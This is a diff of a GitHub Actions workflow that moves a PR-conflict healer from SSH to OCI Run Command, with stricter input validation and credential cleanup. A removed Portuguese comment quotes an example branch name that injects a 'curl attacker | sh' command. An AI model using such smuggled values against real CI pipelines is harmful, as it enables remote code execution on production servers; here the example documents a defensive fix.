@@ -18,12 +18,13 @@ concurrency:
 jobs:
   heal:
     name: Resolve same-repository PR conflicts with private Oracle Gemini pool
-    runs-on: [self-hosted, Linux, ARM64, shopvivaliz-a1-deploy]
+    runs-on: ubuntu-latest
+    environment: Production
     timeout-minutes: 30
     env:
       REPO: ${{ github.repository }}
-      VM_HOST: 127.0.0.1
-      VM_USER: ubuntu
+      OCI_PROFILE: AGENTS
+      SITE_INSTANCE_NAME: shopvivaliz-free-a1
       GH_TOKEN: ${{ github.token }}
 
     steps:
@@ -41,74 +42,120 @@ jobs:
           set -Eeuo pipefail
           python3 -m py_compile trusted/scripts/pr_conflict_gemini_healer.py
           bash -n trusted/scripts/pr_conflict_vm_heal.sh
+          trusted_sha="$(git -C trusted rev-parse HEAD)"
+          [[ "$trusted_sha" =~ ^[0-9a-f]{40}$ ]]
+          echo "TRUSTED_SHA=$trusted_sha" >> "$GITHUB_ENV"
 
-      - name: Configure verified Oracle SSH
-        shell: bash
+      - name: Configure protected OCI AGENTS profile
         env:
-          PRIMARY_KEY: ${{ secrets.SHOPVIVALIZ_VM_SSH_KEY }}
-          LEGACY_KEY: ${{ secrets.ORACLE_VM_SSH_KEY }}
-          PRIMARY_HOSTS: ${{ secrets.SHOPVIVALIZ_VM_KNOWN_HOSTS }}
-          LEGACY_HOSTS: ${{ secrets.ORACLE_VM_KNOWN_HOSTS }}
-        run: |
-          set -Eeuo pipefail
-          key="${PRIMARY_KEY:-${LEGACY_KEY:-}}"
-          known_hosts="${PRIMARY_HOSTS:-${LEGACY_HOSTS:-}}"
-          test -n "$key" || { echo '::error::Oracle SSH key missing'; exit 1; }
-          test -n "$known_hosts" || { echo '::error::Oracle known_hosts missing'; exit 1; }
-          install -m 700 -d "$HOME/.ssh"
-          printf '%s\n' "$key" > "$HOME/.ssh/id_rsa"
-          printf '%s\n' "$known_hosts" > "$HOME/.ssh/known_hosts"
-          chmod 600 "$HOME/.ssh/id_rsa" "$HOME/.ssh/known_hosts"
-
-      - name: Stage trusted healer in Oracle temporary boundary
-        id: stage
+          OCI_CLI_USER: ${{ secrets.OCI_CLI_USER }}
+          OCI_CLI_TENANCY: ${{ secrets.OCI_CLI_TENANCY }}
+          OCI_CLI_FINGERPRINT: ${{ secrets.OCI_CLI_FINGERPRINT }}
+          OCI_CLI_REGION: ${{ secrets.OCI_CLI_REGION }}
+          OCI_CLI_KEY_CONTENT: ${{ secrets.OCI_CLI_KEY_CONTENT }}
         shell: bash
         run: |
           set -Eeuo pipefail
-          ssh -o BatchMode=yes -o StrictHostKeyChecking=yes \
-            -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
-            "${VM_USER}@${VM_HOST}" \
-            "install -d -m 700 /home/ubuntu/.cache/shopvivaliz-pr-healer"
-          remote_dir="$(ssh -o BatchMode=yes -o StrictHostKeyChecking=yes \
-            -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
-            "${VM_USER}@${VM_HOST}" \
-            "mktemp -d /home/ubuntu/.cache/shopvivaliz-pr-healer/run-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}-XXXXXX")"
-          remote_base="${remote_dir}/healer"
-          echo "remote_base=$remote_base" >> "$GITHUB_OUTPUT"
-          scp -q \
-            -o BatchMode=yes -o StrictHostKeyChecking=yes \
-            -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
-            trusted/scripts/pr_conflict_gemini_healer.py \
-            "${VM_USER}@${VM_HOST}:${remote_base}.py"
-          scp -q \
-            -o BatchMode=yes -o StrictHostKeyChecking=yes \
-            -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
-            trusted/scripts/pr_conflict_vm_heal.sh \
-            "${VM_USER}@${VM_HOST}:${remote_base}.sh"
+          for name in OCI_CLI_USER OCI_CLI_TENANCY OCI_CLI_FINGERPRINT OCI_CLI_REGION OCI_CLI_KEY_CONTENT; do
+            test -n "${!name:-}" || { echo "::error::Required OCI healer secret missing: $name"; exit 1; }
+          done
+          OCI_CONFIG_FILE="$RUNNER_TEMP/oci-agents/config"
+          OCI_KEY_FILE="$RUNNER_TEMP/oci-agents/key.pem"
+          printf 'OCI_CONFIG_FILE=%s\nOCI_KEY_FILE=%s\n' "$OCI_CONFIG_FILE" "$OCI_KEY_FILE" >> "$GITHUB_ENV"
+          install -m 700 -d "$(dirname "$OCI_CONFIG_FILE")"
+          printf '%s' "$OCI_CLI_KEY_CONTENT" > "$OCI_KEY_FILE"
+          chmod 600 "$OCI_KEY_FILE"
+          cat > "$OCI_CONFIG_FILE" <<EOF
+          [AGENTS]
+          user=$OCI_CLI_USER
+          fingerprint=$OCI_CLI_FINGERPRINT
+          tenancy=$OCI_CLI_TENANCY
+          region=$OCI_CLI_REGION
+          key_file=$OCI_KEY_FILE
+          EOF
+          chmod 600 "$OCI_CONFIG_FILE"
 
-      - name: Preflight private Gemini credential pool
+      - name: Resolve exact site A1 and Run Command plugin
         shell: bash
-        env:
-          REMOTE_BASE: ${{ steps.stage.outputs.remote_base }}
         run: |
           set -Eeuo pipefail
-          ssh -o BatchMode=yes -o StrictHostKeyChecking=yes \
-            -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
-            "${VM_USER}@${VM_HOST}" \
-            "GEMINI_ENV_FILE=/home/ubuntu/shopvivaliz-deploy/shared/.env python3 '${REMOTE_BASE}.py' --credential-preflight"
+          python3 -m pip install --disable-pip-version-check --quiet oci-cli
+          OCI=(oci --config-file "$OCI_CONFIG_FILE" --profile "$OCI_PROFILE")
+          "${OCI[@]}" iam region list >/dev/null
+          query="query instance resources where displayName = '$SITE_INSTANCE_NAME'"
+          count="$("${OCI[@]}" search resource structured-search --query-text "$query" --query 'length(data.items)' --raw-output)"
+          test "$count" = 1 || { echo "::error::Expected one site A1 instance, found $count"; exit 2; }
+          instance_id="$("${OCI[@]}" search resource structured-search --query-text "$query" --query 'data.items[0].identifier' --raw-output)"
+          compartment_id="$("${OCI[@]}" compute instance get --instance-id "$instance_id" --query 'data."compartment-id"' --raw-output)"
+          lifecycle="$("${OCI[@]}" compute instance get --instance-id "$instance_id" --query 'data."lifecycle-state"' --raw-output)"
+          test "$lifecycle" = RUNNING || { echo "::error::Site A1 not RUNNING"; exit 3; }
+          plugin="$("${OCI[@]}" instance-agent plugin list --compartment-id "$compartment_id" --instanceagent-id "$instance_id" --query 'data[?name==`Compute Instance Run Command`].status | [0]' --raw-output)"
+          test "$plugin" = RUNNING || { echo "::error::Run Command plugin is not RUNNING"; exit 4; }
+          printf 'SITE_INSTANCE_ID=%s\nSITE_COMPARTMENT_ID=%s\n' "$instance_id" "$compartment_id" >> "$GITHUB_ENV"
+          echo "OCI_SITE_HEALER_IDENTITY=PASS"
 
-      - name: Heal and synchronize eligible PR branches
+      - name: Heal and synchronize eligible PR branches through OCI Run Command
         shell: bash
-        env:
-          REMOTE_BASE: ${{ steps.stage.outputs.remote_base }}
         run: |
           set -Eeuo pipefail
-          if [[ "$GITHUB_EVENT_NAME" == 'pull_request_target' ]]; then
+          OCI=(oci --config-file "$OCI_CONFIG_FILE" --profile "$OCI_PROFILE")
+
+          run_remote() {
+            local display="$1"
+            local script_file="$2"
+            local content target command_id execution state code output
+            content="$(mktemp)"
+            target="$(mktemp)"
+            jq -n --rawfile text "$script_file" '{source:{sourceType:"TEXT",text:$text},output:{outputType:"TEXT"}}' > "$content"
+            jq -n --arg instanceId "$SITE_INSTANCE_ID" '{instanceId:$instanceId}' > "$target"
+            command_id="$("${OCI[@]}" instance-agent command create               --compartment-id "$SITE_COMPARTMENT_ID"               --display-name "$display"               --content "file://$content"               --target "file://$target"               --timeout-in-seconds 300               --query 'data.id' --raw-output)"
+            rm -f "$content" "$target"
+            execution=''
+            for _ in $(seq 1 75); do
+              execution="$("${OCI[@]}" instance-agent command-execution get                 --command-id "$command_id"                 --instance-id "$SITE_INSTANCE_ID")"
+              state="$(jq -r '.data."lifecycle-state"' <<<"$execution")"
+              case "$state" in
+                SUCCEEDED|FAILED|TIMED_OUT|CANCELED) break ;;
+                ACCEPTED|IN_PROGRESS) sleep 4 ;;
+                *) echo "::error::Unexpected OCI command state: $state"; return 41 ;;
+              esac
+            done
+            code="$(jq -r '.data.content."exit-code" // -1' <<<"$execution")"
+            output="$(jq -r '.data.content.text // ""' <<<"$execution")"
+            printf '%s\n' "$output"
+            test "$state" = SUCCEEDED && test "$code" = 0
+          }
+
+          stage="$RUNNER_TEMP/stage-healer.sh"
+          cat > "$stage" <<REMOTE
+          set -Eeuo pipefail
+          install -d -m 700 /home/ubuntu/.cache/shopvivaliz-pr-healer
+          remote_dir=\$(mktemp -d /home/ubuntu/.cache/shopvivaliz-pr-healer/run-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}-XXXXXX)
+          base="\$remote_dir/healer"
+          curl -fsSL --connect-timeout 10 --max-time 30 --retry 3             "https://raw.githubusercontent.com/${REPO}/${TRUSTED_SHA}/scripts/pr_conflict_gemini_healer.py"             -o "\${base}.py"
+          curl -fsSL --connect-timeout 10 --max-time 30 --retry 3             "https://raw.githubusercontent.com/${REPO}/${TRUSTED_SHA}/scripts/pr_conflict_vm_heal.sh"             -o "\${base}.sh"
+          chmod 700 "\${base}.py" "\${base}.sh"
+          GEMINI_ENV_FILE=/home/ubuntu/shopvivaliz-deploy/shared/.env python3 "\${base}.py" --credential-preflight
+          printf 'REMOTE_BASE=%s\n' "\$base"
+          REMOTE
+          stage_output="$(run_remote "Stage trusted PR healer" "$stage")"
+          printf '%s\n' "$stage_output"
+          remote_base="$(awk -F= '$1=="REMOTE_BASE"{print $2}' <<<"$stage_output" | tail -1)"
+          [[ "$remote_base" =~ ^/home/ubuntu/\.cache/shopvivaliz-pr-healer/run-[A-Za-z0-9._-]+/healer$ ]]
+
+          cleanup() {
+            set +e
+            cleanup_file="$RUNNER_TEMP/cleanup-healer.sh"
+            printf 'rm -rf -- %q\n' "${remote_base%/*}" > "$cleanup_file"
+            run_remote "Cleanup trusted PR healer" "$cleanup_file" >/dev/null 2>&1 || true
+          }
+          trap cleanup EXIT
+
+          if [[ "$GITHUB_EVENT_NAME" == pull_request_target ]]; then
             prs=("${{ github.event.pull_request.number }}")
           else
             mapfile -t prs < <(
-              gh api "repos/${REPO}/pulls?state=open&base=main&per_page=100" \
-                --jq '.[] | select(.draft == false) | .number'
+              gh api "repos/${REPO}/pulls?state=open&base=main&per_page=100"                 --jq '.[] | select(.draft == false) | .number'
             )
           fi
 
@@ -122,50 +169,26 @@ jobs:
             head_sha="$(jq -r '.head.sha' <<<"$meta")"
             base_ref="$(jq -r '.base.ref' <<<"$meta")"
 
-            if [[ "$state" != 'open' || "$draft" == 'true' || "$head_repo" != "$REPO" || "$base_ref" != 'main' ]]; then
+            if [[ "$state" != open || "$draft" == true || "$head_repo" != "$REPO" || "$base_ref" != main ]]; then
               echo "pr_${pr}_skipped=true"
               continue
             fi
+            [[ "$head_ref" =~ ^[A-Za-z0-9._/-]+$ ]] || { echo "pr_${pr}_skipped_unsafe_ref=true"; continue; }
+            [[ "$head_sha" =~ ^[0-9a-f]{40}$ ]] || { echo "pr_${pr}_skipped_unsafe_sha=true"; continue; }
 
-            # Rodada 2 (2026-08-18): head_ref e head_sha sao interpolados numa string
-            # de comando remoto (ssh "... '${head_ref}' ..."). As aspas simples so
-            # protegem enquanto o valor nao contiver uma aspa simples -- e nomes de
-            # branch do Git PODEM conter aspa simples. Sem esta checagem, uma branch
-            # chamada por exemplo x'; curl attacker/s | sh; ' resultaria em execucao
-            # remota de codigo na VM de producao como usuario ubuntu. O repo tem
-            # multiplos agentes autonomos criando branches, entao o vetor nao e so
-            # hipotetico. Nomes de branch e SHAs legitimos sempre casam com os regex
-            # abaixo, entao isto nao afeta o fluxo normal.
-            if [[ ! "$head_ref" =~ ^[A-Za-z0-9._/-]+$ ]]; then
-              echo "pr_${pr}_skipped_unsafe_ref=true"
-              continue
-            fi
-            if [[ ! "$head_sha" =~ ^[0-9a-f]{40}$ ]]; then
-              echo "pr_${pr}_skipped_unsafe_sha=true"
-              continue
-            fi
-
-            ssh -o BatchMode=yes -o StrictHostKeyChecking=yes \
-              -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
-              "${VM_USER}@${VM_HOST}" \
-              "bash '${REMOTE_BASE}.sh' '${pr}' '${head_ref}' '${head_sha}' '${REMOTE_BASE}.py'"
+            heal="$RUNNER_TEMP/heal-${pr}.sh"
+            printf 'exec bash %q %q %q %q %q\n'               "${remote_base}.sh" "$pr" "$head_ref" "$head_sha" "${remote_base}.py" > "$heal"
+            run_remote "Heal ShopVivaliz PR #${pr}" "$heal"
             echo "pr_${pr}_oracle_heal_completed=true"
           done
 
-      - name: Remove Oracle and runner temporary material
+      - name: Cleanup OCI credentials
         if: always()
         shell: bash
-        env:
-          REMOTE_BASE: ${{ steps.stage.outputs.remote_base }}
         run: |
-          set -Eeuo pipefail
-          if [[ -n "${REMOTE_BASE:-}" && -r "$HOME/.ssh/id_rsa" && -r "$HOME/.ssh/known_hosts" ]]; then
-            ssh -o BatchMode=yes -o StrictHostKeyChecking=yes \
-              -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
-              "${VM_USER}@${VM_HOST}" \
-              "rm -rf -- '${REMOTE_BASE%/*}'"
-          fi
-          rm -f "$HOME/.ssh/id_rsa" "$HOME/.ssh/known_hosts"
+          set +e
+          test -n "${OCI_KEY_FILE:-}" && test -f "$OCI_KEY_FILE" && shred -u "$OCI_KEY_FILE"
+          test -n "${OCI_CONFIG_FILE:-}" && test -f "$OCI_CONFIG_FILE" && shred -u "$OCI_CONFIG_FILE"
 
       - name: Security invariant
         if: always()
